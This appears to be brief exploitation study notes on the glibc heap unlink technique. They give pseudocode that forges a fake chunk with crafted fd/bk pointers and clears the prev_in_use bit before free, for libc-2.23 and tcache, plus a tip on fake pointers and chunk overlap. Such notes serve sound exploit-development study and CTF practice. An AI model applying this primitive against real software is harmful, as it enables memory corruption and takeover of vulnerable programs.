# Heap Unlink

## Unlink on libc-2.23
### payload
```
bss void* tmp;
tmp = malloc(0x30);
void* b = malloc(0x1f0);
tmp[0] = 0
tmp[1] = 0x31
tmp[2] = &tmp-0x18
tmp[3] = &tmp-0x10
.....
char* x = (char*)b-8;
x[0] = 0 -> make prev_in_use_bit to 0
free(b)
```

## Unlink on tcache
### payload
```
fill the tcache first
same as libc-2.23
```

## Tips
### Case
```
When the address, which stores the heap ptr, is unkown
make a fake ptr point to the heap chunk
and then
unlink
(maybe cause chunk overlap)
```
